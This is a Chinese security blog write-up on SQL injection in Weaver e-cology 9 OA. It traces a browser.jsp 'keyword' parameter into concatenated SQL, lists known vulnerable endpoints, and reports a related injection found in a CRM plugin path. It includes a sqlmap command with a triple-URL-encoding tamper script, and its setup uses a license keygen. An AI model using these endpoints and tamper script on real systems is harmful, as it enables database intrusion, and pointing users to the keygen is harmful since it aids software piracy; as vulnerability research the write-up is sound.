#  分析某oa历史漏洞中捡到CNVD证书  
原创 莫大130  安全逐梦人   2025-06-22 15:22  
  
   
  
# 环境搭建  
## Ecology9安装  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXA03DJohkQsia6ib5eFdk8uCEH7iaqB59h3IK56bvMCnkoW8a0Zqrz2pDw/640?wx_fmt=png&from=appmsg "")  
  
运行 Ecology9.00.2206.02.exe  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAX4n1QA8pDBMWBqubibo1XA3oaPC5CsLjYlKIExibj6XeE3XcagnZXvRRQ/640?wx_fmt=png&from=appmsg "")  
  
  
配置JDK目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXibNZpGYj3wCggzufiaYPwV4mScCVWRY2GOSYBeI66QKu1BhNUJdMatEw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXdYIl29E0ce4enUAhfQ78pu98boJm9XnBLkKrOPmktEz70hJ45z2rjw/640?wx_fmt=png&from=appmsg "")  
  
接着等待安装完成  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXeIPe8ZqXCxNf5a2PYO0lQz8GYpibgVay8qfABibOibXI5nibicB7U7ZaBhQ/640?wx_fmt=png&from=appmsg "")  
  
安装完成后，打开 C:\WEAVER\Resin  
 目录下的 setup.exe  
 运行 安装 Resin  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXOsEvZgrU7Ov1FPWyKia08pX2cMD85PIibYQIluFgh0pQFztgJnEJKcCw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXUyXfPzvbS5pkQ7RTI4sDvsCrUvxj6y1jepO0tvAfJGPicrPyQq3veZA/640?wx_fmt=png&from=appmsg "")  
  
  
打开 C:\WEAVER\Resin  
 目录下的 resinstart.bat  
 启动Resin  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXY1iaVNuWYeU3mibCN7Ahian9F6QYglqWic72Kol6y4bxTXmX7qIiagibH3vg/640?wx_fmt=png&from=appmsg "")  
## 创建数据库  
  
在SQL Server数据库中创建一个名称为Ecology9  
 库  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXmHStXF5b6EY2Jv8zMYZSLASqzbKX2ut66dSdjHaUDXGfy0Ps0kMQEA/640?wx_fmt=png&from=appmsg "")  
  
填入数据库账号密码，初始化数据库  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXCR2BGBJM0hf9zyHLlvt0h4SicrWMRmfDeHRia139j3KVop4Rp17FNUcA/640?wx_fmt=png&from=appmsg "")  
## 使用注册机授权  
  
点击登录后可能弹出license验证。license验证时将识别码放入 Ecology9-2020注册机.jar  
 注册机中生成license文件，导入。验证码处依旧填入wEAver2018  
。验证success后  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXyWv96uUn4rfBYxDshKCkwdw4Pibqy42IWoTfszhohia0e7RuXIBAnQZA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAX7SG23DERaLxgveic955OJPzic3RwPkC7FbKJOawOAKWdLISuZFaQr31A/640?wx_fmt=png&from=appmsg "")  
## 调试方法  
  
Resin目录下/conf/resin.properties文件中找到jvm_args  
参数，在参数值中加入  
```
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005
```  
## 基础知识  
- • 环境安装验证码: /ecology/WEB-INF/code.key  
文件中  
  
- • 管理员账号: 位于数据表HrmResourceManager  
，密码为md5  
加密，无法解码的情况下，可通过/api/ec/dev/locale/getLabelByModule  
路径的sql注入漏洞修改密码  
  
- • 环境信息查看: 访问http://ip:port/security/monitor/Monitor.jsp  
，包含操作系统版本、ecology版本、web中间件版本、JVM版本、客户端软件和规则库版本  
  
- • 编译后的class文件: /ecology/classbean/  
 文件夹下  
  
- • 系统运行依赖的jar: /ecology/WEB-INF/lib/  
 文件夹下  
  
## 路由特点  
  
（1）/weaver  
 服务器为resin，查看resin.xml。它配置了invoker servlet，即一种默认访问servlet的方式，可以运行没有在web.xml中配置的servlet。访问路径为/weaver/*  
，*  
后是被访问的Java类，该类需要满足两个要求  
  
1、采用完全限定名  
  
2、实现servlet或HttpServlet相关接口。  
```
<web-app id="/" root-directory="C:\Users\Administrator\Desktop\Ecology1907\ecology">      <servlet-mapping url-pattern='/weaver/*' servlet-name='invoker'/>      <form-parameter-max>100000</form-parameter-max>  </web-app>
```  
  
所以lib目录下的bsh-2.0b4.jar可以按照全限定类名/bsh.servlet.BshServlet  
访问BshServlet  
类，该类实现了HttpServlet  
接口  
```
public class BshServlet extends HttpServlet {      public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {          String var3 = var1.getParameter("bsh.script");          ...          var8 = this.evalScript(var3, var10, var7, var1, var2);      }  }
```  
  
/ecology/classbean/  
目录下均为Java类，想要访问该目录下的类都采用/weaver  
的方式  
  
（2）/xx.jsp  
 jsp访问路径均为ecology根目录到该jsp的路径，例如jsp的绝对路为D:/ecology/addressbook/AddressBook.jsp  
，那么该jsp的访问路径为http://ip:port/addressbook/AddressBook.jsp  
  
（3）/services/*  
 /services/*  
的服务配置由org.codehaus.xfire.transport.http.XFireConfigurableServlet  
读取classbean/META-INF/xfire/services.xml  
文件进行加载创建。配置文件各服务节点结构大致如下  
```
    <service>           <name>DocService</name>            <namespace>http://localhost/services/DocService</namespace>            <serviceClass>weaver.docs.webservices.DocService</serviceClass>            <implementationClass>weaver.docs.webservices.DocServiceImpl</implementationClass>            <serviceFactory>org.codehaus.xfire.annotations.AnnotationServiceFactory</serviceFactory>       </service>
```  
  
那么可以通过/services/DocService  
的方式访问该接口。  
  
（4）/api/*  
 由@Path  
注解定义的一系列REST  
接口，可以在ecology/WEB-INF/Api.xls  
文件中查看所有的api  
接口路径和相关类。泛微E9版本开始新增了/api路由，在旧版本中，该路由存在大小写绕过鉴权的漏洞。  
  
（5）/*.do  
 由实现了weaver.interfaces.workflow.action.Action  
接口的action  
，由ecology/WEB-INF/service/*.xml所配置  
```
<action path="/getProcess" type="com.weaver.action.EcologyUpgrade" parameter="getProcess" >  </action>
```  
  
可通过/<path>.do  
的方式访问。  
# 历史漏洞  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">漏洞名称</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">漏洞路径</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">泛微OA E Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">/services/WorkflowServiceXml</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">泛微e-cology9 CheckServer.jsp SQL注入</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">泛微e-cology9 browser.jsp sql注入</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">/mobile/%20/plugin/browser.jsp</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">泛微e-cology9 FileDownloadLocation 存在SQL注入漏洞</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation</span></section></td></tr></tbody></table>  
## browser.jsp 注入漏洞  
  
从历史漏洞得知 browser.jsp  
 文件中参数 keyword  
 存在sql注入，分析如何将参数传入sql中的  
```
<%@ page language="java" contentType="text/html; charset=UTF-8"%>  <%@ page import="weaver.general.Util"%>  <%@ page import="weaver.hrm.HrmUserVarify"%>  <%@ page import="weaver.hrm.User"%>  <%@page import="weaver.mobile.webservices.common.BrowserAction"%>
```  
  
文件开头引用了 weaver.mobile.webservices.common.BrowserAction  
 类，是sql注入漏洞产生的类  
```
<%@ page language="java" contentType="text/html; charset=UTF-8"%>  <%@ page import="weaver.general.Util"%>  <%@ page import="weaver.hrm.HrmUserVarify"%>  <%@ page import="weaver.hrm.User"%>  <%@pageimport="weaver.mobile.webservices.common.BrowserAction"%>  <%  Stringmethod= Util.null2String(request.getParameter("method"));  intbrowserTypeId= Util.getIntValue(request.getParameter("browserTypeId"), 0);  StringcustomBrowType= Util.null2String(request.getParameter("customBrowType"));  inthrmOrder= Util.getIntValue(request.getParameter("_hrmorder_"), 0);  Stringlinkhref=  Util.null2String(request.getParameter("linkhref"));  String joinFieldParams= Util.null2String(request.getParameter("joinFieldParams"));  intpageNo= Util.getIntValue(request.getParameter("pageno"), 1);  intpageSize= Util.getIntValue(request.getParameter("pageSize"), 10);  Stringkeyword= Util.null2String(request.getParameter("keyword"));  //qc273075 [1703补丁包测试]流程展现集成-解决手机端输入+作为查询条件失效的问题 startboolean replace=false;  if(keyword.indexOf("+")>=0){      replace=true;      }else{         replace=false;      }  keyword = java.net.URLDecoder.decode(keyword, "UTF-8");  if(replace){      keyword=keyword.replace(" ","+");  } //qc273075 [1703补丁包测试]流程展现集成-解决手机端输入+作为查询条件失效的问题 endint fnaworkflowid = Util.getIntValue(request.getParameter("fnaworkflowid"), -1);  Stringfnafieldid= Util.null2String(request.getParameter("fnafieldid"));  booleanisDis="1".equals(Util.null2String(request.getParameter("isDis"))) ? true : false;  if (!isDis) {     request.getRequestDispatcher("/mobile/plugin/dialog.jsp").forward(request, response);     return;  }  //User user = HrmUserVarify.getUser (request , response);  String f_weaver_belongto_userid=Util.null2String(request.getParameter("f_weaver_belongto_userid"));//需要增加的代码  String f_weaver_belongto_usertype=Util.null2String(request.getParameter("f_weaver_belongto_usertype"));//需要增加的代码  Useruser= HrmUserVarify.getUser(request, response, f_weaver_belongto_userid, f_weaver_belongto_usertype) ;//需要增加的代码  BrowserActionbraction=newBrowserAction(user, browserTypeId, pageNo, pageSize);  braction.setKeyword(keyword);  if("listFnaBudgetFeeType".equals(method)){//是科目浏览按钮：财务 QC141205 科目应用范围过滤     boolean_flag= Util.getIntValue(request.getParameter("isFnaSubmitRequest4Mobile"), -1)==1;     if(_flag){        intorgtype= Util.getIntValue(request.getParameter("orgtype"), -1);        intorgid= Util.getIntValue(request.getParameter("orgid"), -1);        intorgtype2= Util.getIntValue(request.getParameter("orgtype2"), -1);        intorgid2= Util.getIntValue(request.getParameter("orgid2"), -1);        braction.setFnaSubmitRequest4Mobile(_flag);      braction.setOrgtype(orgtype);      braction.setOrgid(orgid);      braction.setOrgtype2(orgtype2);      braction.setOrgid2(orgid2);   }}elseif("listWorkflowRequest".equals(method)){//单请求浏览按钮：财务 QC141220   boolean _flag = false;     if(!_flag){        //还款（报销）流程的明细表（冲账明细）的字段：借款流程        _flag = Util.getIntValue(request.getParameter("isFnaRepayRequest4Mobile"), -1)==1;        if(_flag){           intfnaWfRequestid= Util.getIntValue(request.getParameter("fnaWfRequestid"), 0);           intmain_fieldIdSqr_controlBorrowingWf= Util.getIntValue(request.getParameter("main_fieldIdSqr_controlBorrowingWf"), 0);           intmain_fieldIdSqr_val= Util.getIntValue(request.getParameter("main_fieldIdSqr_val"), 0);           braction.setFnaRepayRequest4Mobile(true);           braction.setFnaWfRequestid(fnaWfRequestid);         braction.setMain_fieldIdSqr_controlBorrowingWf(main_fieldIdSqr_controlBorrowingWf);         braction.setMain_fieldIdSqr_val(main_fieldIdSqr_val);      }   }   if(!_flag){        //是报销流程的主表的字段：费用申请流程        _flag = Util.getIntValue(request.getParameter("isFnaRequestApplication4Mobile"), -1)==1;        if(_flag){           intfnaWfRequestid= Util.getIntValue(request.getParameter("fnaWfRequestid"), 0);           braction.setFnaRequestApplication4Mobile(true);           braction.setFnaWfRequestid(fnaWfRequestid);      }   }}  braction.setMethod(method);  braction.setHrmOrder(hrmOrder);  //分权用  braction.setCustomBrowType(customBrowType);  braction.setJoinFieldParams(joinFieldParams);  braction.setLinkhref(linkhref);  braction.setFnafieldid(fnafieldid);  braction.setFnaworkflowid(fnaworkflowid);  Stringresult= braction.getBrowserData();  response.getOutputStream().write(result.getBytes("UTF-8"));  response.getOutputStream().flush();  %>
```  
  
代码16行定义了keyword变量，并且使用request.getParameter("keyword")  
 来获取前端传入的值  
  
代码19行，使用if判断keyword值中有没有+  
 号  
  
25行代码中使用了java.net.URLDecoder.decode  
实现keyword值URL解码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAX07Xk771PgGRt6QsxeX6KKSVMfTc7QaLJ9m0JUSQtpH13EwIpRYhB0g/640?wx_fmt=png&from=appmsg "")  
```
boolean isDis = "1".equals(Util.null2String(request.getParameter("isDis"))) ? true : false;  if (!isDis) {     request.getRequestDispatcher("/mobile/plugin/dialog.jsp").forward(request, response);     return;  }
```  
  
isDis  
 参数必须为1，不然就会跳转/mobile/plugin/dialog.jsp  
```
BrowserAction braction = new BrowserAction(user, browserTypeId, pageNo, pageSize);  braction.setKeyword(keyword);
```  
  
BrowserAction  
 传入参数(user, browserTypeId, pageNo, pageSize)  
  
braction.setKeyword(keyword);  
设置setKeyword  
的值为keyword  
 ,等于将request.getParameter("keyword")) 的值传入BrowserAction中的 private String keyword = "";  
```
public void setKeyword(String var1) {      this.keyword = var1;  }
```  
  
我们只需要找拼接了this.keyword  
 的sql语句  
### BrowserAction  
  
路径：ecology\classbean\weaver\mobile\webservices\common\BrowserAction.class  
  
在BrowserAction  
 类中， 定义了 browserTypeId  
,keyword  
 初始值  
```
public classBrowserActionextendsBaseBean {      privatestaticfinalLoglog= LogFactory.getLog(BrowserAction.class);      privatestaticfinalLoggerlogger= LoggerFactory.getLogger(BrowserAction.class);      privateUseruser=null;      privateintbrowserTypeId=0;      privateStringkeyword="";      privatebooleanfnaSubmitRequest4Mobile=false;      privateintorgtype= -1;      privateintorgid= -1;      privateintorgtype2= -1;      privateintorgid2= -1;      privateintfnaworkflowid= -1;      privateStringfnafieldid="";      privatebooleanisFnaRepayRequest4Mobile=false;      privateintmain_fieldIdSqr_controlBorrowingWf=0;      privateintmain_fieldIdSqr_val=0;      privatebooleanisFnaRequestApplication4Mobile=false;      privateintfnaWfRequestid=0;      privatePagepageInfo=null;      privateinthrmOrder=0;      privateStringcustomBrowType="";      privateStringmethod="";      privateStringjoinFieldParams="";      privateStringlinkhref="";      publicBrowserAction(User var1, int var2) {          this.pageInfo = newPage(20);          this.pageInfo.setPageNo(1);          this.user = var1;          this.browserTypeId = var2;      }      publicBrowserAction(User var1, int var2, int var3, int var4) {          this.user = var1;          this.browserTypeId = var2;          this.pageInfo = newPage(var4);          this.pageInfo.setPageNo(var3);      }
```  
  
定义了两个构造函数BrowserAction  
 分别接收2个参数和4个参数，在browser.jsp  
 使用的构造函数是第二个public BrowserAction(User var1, int var2, int var3, int var4)  
### getBrowserData函数  
```
public String getBrowserData() {      try {          if (this.browserTypeId != 161 && this.browserTypeId != 162) {              if (this.browserTypeId != 165 && this.browserTypeId != 166) {                  if (this.browserTypeId != 167 && this.browserTypeId != 168) {                      if (this.browserTypeId != 169 && this.browserTypeId != 170) {                          if (this.browserTypeId == 160) {                              this.listRoleUsers();                          } elseif (this.browserTypeId == -9) {                              this.listRejectNode();                          } elseif (this.browserTypeId == -100) {                              this.listRejectNode100();                          } elseif (this.browserTypeId == -10) {                              this.listSignTure();                          } elseif (this.browserTypeId == 12) {                              this.listFnaCurrency();                          } elseif (this.browserTypeId == 269) {                              this.listRemindType();                          }                      } else {                          this.listSubCompanyByDec();                      }                  } else {                      this.listDepartmentByDec();                  }              } else {                  this.listUserByDec();              }          } else {              this.customBrowser();          }          if ("listCpt".equals(this.method)) {              this.listCpt();          } elseif ("listZczl".equals(this.method)) {              this.listZczl();          } elseif ("listUser".equals(this.method)) {              this.listUser();          } elseif ("listDepartment".equals(this.method)) {              this.listDepartment();          } elseif ("listSubCompany".equals(this.method)) {              this.listSubCompany();          } elseif ("listLeaveType".equals(this.method)) {              this.listLeaveType();          } elseif ("listWorkflowRequest".equals(this.method)) {              this.listWorkflowRequest();          } elseif ("listDocument".equals(this.method)) {              this.listDocument();          } elseif ("listCustomer".equals(this.method)) {              this.listCustomer();          } elseif ("listProject".equals(this.method)) {              this.listProject();          } elseif ("listCar".equals(this.method)) {              this.listCar();          } elseif ("listMeeting".equals(this.method)) {              this.listMeeting();          } elseif ("listMeetingRoom".equals(this.method)) {              this.listMeetingRoom();          } elseif ("listMeetingType".equals(this.method)) {              this.listMeetingType();          } elseif ("listFnaBudgetFeeType".equals(this.method)) {              this.listFnaBudgetFeeType();          } elseif ("listFnaCostCenter".equals(this.method)) {              this.listFnaCostCenter();          } elseif ("listScheduleShifts".equals(this.method)) {              this.listScheduleShifts();          } elseif ("listJobTitles".equals(this.method)) {              this.listJobTitles();          } elseif ("listJobCall".equals(this.method)) {              this.listJobCall();          } elseif ("listServiceItem".equals(this.method)) {              this.listServiceItem();          } elseif ("listHrmLocation".equals(this.method)) {              this.listHrmLocation();          } elseif ("listMutiRoles".equals(this.method)) {              this.listMutiRoles();          } elseif ("listFnaInvoice".equals(this.method)) {              this.listFnaInvoice();          }          JSONObjectvar1= JSONObject.fromObject(this.pageInfo);          return var1.toString();      } catch (Exception var2) {          log.error("Catch a exception", var2);          return"";      }  }
```  
  
从getBrowserData  
方法中知道，如何调用BrowserAction  
中的方法，主要this.method  
 和 this.browserTypeId  
 来控制的，这两个变量也可从前端输入获取。  
### listRemindType  
```
public voidlistRemindType() {      try {          newMeetingBrowser();          this.keyword = URLDecoder.decode(this.keyword, "UTF-8");          if (this.pageInfo.getPageNo() > 0) {              this.pageInfo.setPageNo(this.pageInfo.getPageNo());          }          RecordSetvar1=newRecordSet();          Stringvar2=" select count(0) as count from meeting_remind_type t1  where isuse=1 ";          if (StringUtils.isNotEmpty(this.keyword)) {              var2 = var2 + " and name like '%" + this.keyword + "%'";          }          var1.executeSql(var2);          intvar3=0;          if (var1.next()) {              var3 = Util.getIntValue(var1.getString("count"), 0);          }          this.pageInfo.setTotalCount(var3);          Stringvar4=" from  meeting_remind_type t1  ";          Stringvar5="t1.id as id,t1.name as name";          Stringvar6=" where isuse=1 ";          if (StringUtils.isNotEmpty(this.keyword)) {              var6 = var6 + " and t1.name like '%" + this.keyword + "%' ";          }          Stringvar7="t1.id";          Stringvar8="t1.id";          log.info("select " + var5 + var4 + " where " + var6);          this.pageInfo.setResult(this.getLimitPageData(var5, var4, var6, var7, var8, 1, this.pageInfo.getPageNo(), this.pageInfo.getPageSize(), 3));      } catch (Exception var9) {          var9.printStackTrace();      }  }
```  
  
从代码中可以看到在sql语句中拼接了this.keyword  
```
var2 = var2 + " and name like '%" + this.keyword + "%'";  
```  
### 漏洞复现  
```
python sqlmap.py -r 1.txt --tamper=urlencode3 --batch --random-agent --level 3
```  
#### tamper 脚本  
```
#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdefdependencies():    pass# URL encoding for all charactersdeftamper(payload, **kwargs):    encoded_payload = ''.join(['%' + format(ord(c), 'x') for c in payload])    encoded_payload = ''.join(['%' + format(ord(c), 'x') for c in encoded_payload])    encoded_payload = ''.join(['%' + format(ord(c), 'x') for c in encoded_payload])    encoded_payload = encoded_payload.replace(' ', '%20')    return encoded_payload
```  
## 捡到CNVD证书  
  
从上一个 browser.jsp 注入漏洞中发现，其他目录也存在该文件  
  
漏洞文件路径：\ecology\mobile\plugin\crm\browser.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXWQjO0NWesbJz7gB0SV6NOTnlZnZjNuCHgg8Cqmib6ic2Zibey43OW2lXw/640?wx_fmt=png&from=appmsg "")  
  
Keyword   
参数传入了 BrowserAction   
类中，并且在类中的方法中sql语句拼接了 Keyword   
参数，导致sql注入漏洞  
  
ecology\classbean\weaver\mobile\webservices\common\BrowserAction.class  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXqgQ2Y9w0ohtsvo6mCSxafQ7tTlM9xGia1Zr93b3NicB0icaaI1OtzSNJQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现按照上面  
browser.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXNAHCoP9QDTHTjlEV4l97w1Bq6iaXTgom8qOYdVMzhVTP3FubJ74V45w/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz7hRT2jhFdwf0SqAbATANAXibPetD85kEymgsZLPKD87DpgKn9auqkia8BJdg3TGn1mvczAHTATBic9A/640?wx_fmt=png&from=appmsg "")  
  
  
  
   
  
#### 参考文章  
  
https://blog.csdn.net/qq_35086986/article/details/129853901  
  
   
  
  
